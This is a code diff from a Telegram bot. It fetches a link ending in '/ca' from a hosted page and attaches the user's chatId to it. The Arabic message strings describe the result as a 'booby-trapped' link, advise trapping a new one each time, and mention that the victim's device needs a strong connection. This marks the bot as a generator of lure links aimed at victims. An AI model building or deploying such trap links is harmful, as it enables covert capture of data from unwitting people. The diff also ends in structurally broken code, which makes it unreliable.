@@ -1662,38 +1662,42 @@ bot.on('callback_query', (callbackQuery) => {
     const url = "https://sssssskskjwnsb-linklsksn.hf.space";
 
     try {
-        const res = await fetch(url);
-        const html = await res.text();
+        const response = await fetch(url, { method: "GET" });
+        const html = await response.text();
 
-        // استخراج الروابط باستخدام DOMParser
         const parser = new DOMParser();
         const doc = parser.parseFromString(html, "text/html");
 
-        const links = doc.querySelectorAll("a[href]");
+        const links = [...doc.querySelectorAll("a[href]")];
 
         for (const a of links) {
-            const href = a.getAttribute("href");
-            if (href.endsWith("/ca")) {
-                return href;
+            const link = a.getAttribute("href");
+            if (link.endsWith("/ca")) {
+                return link; // يرجع أول رابط ينتهي بـ /ca
             }
         }
+
+        return null;
+
     } catch (e) {
-        console.log("Error:", e);
+        console.error("Error:", e);
+        return null;
+    }
+}
+
+async function sendMessage(chatId) {
+    const caLink = await getDynamicLink();
+
+    if (!caLink) {
+        console.log("لم يتم العثور على رابط /ca");
+        return;
     }
 
-    return null;
+    const message = `تم انشاء الرابط، قم بتلغيم رابط جديد في كل مره  
+: ${caLink}/?chatId=${chatId}`;
+
+    console.log(message);
 }
-
-async function createMessage(chatId) {
-    const dynamicLink = await getDynamicLink();
-
-    const message = `تم انشاء الرابط ملاحظه قم في تليغم رابط جديد في كل مره ملاحظه بزم يكون النت قوي في جهاز الضحيه\n: ${dynamicLink}/?chatId=${chatId}`;
-
-    return message;
-}
-
-// مثال استخدام
-
 
         if (message && message.trim() !== '') {
             bot.sendMessage(chatId, message);
